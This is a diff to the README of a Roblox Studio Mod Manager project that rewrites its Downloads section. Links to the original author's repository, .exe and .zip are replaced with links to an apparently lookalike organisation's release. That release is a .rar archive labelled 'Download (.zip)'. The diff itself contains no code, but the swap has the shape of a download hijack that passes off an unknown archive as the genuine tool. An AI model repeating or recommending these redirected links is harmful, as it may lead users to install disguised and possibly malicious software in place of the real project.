@@ -35,8 +35,7 @@ https://twitter.com/BoatbomberRBLX/status/1347262909915738113
 # Downloads
 
 The latest version can be found on the ***Releases*** page of this repository:<br/>
-https://github.com/MaximumADHD/Roblox-Studio-Mod-Manager/releases
+https://github.com/Roblox-Studio-Mod-Manager/Roblox-Studio-Mod-Manager/releases
 
 You can also download the latest committed versions here:
-* <a href="https://github.com/MaximumADHD/Roblox-Studio-Mod-Manager/raw/main/RobloxStudioModManager.exe">Download (.exe)</a></h1>
-* <a href="https://github.com/MaximumADHD/Roblox-Studio-Mod-Manager/archive/main.zip">Download (.zip)</a>
+* <a href="https://github.com/Roblox-Studio-Mod-Manager/Roblox-Studio-Mod-Manager/releases/download/v2023.04.06/Roblox.Mod.Manager.rar">Download (.zip)</a>
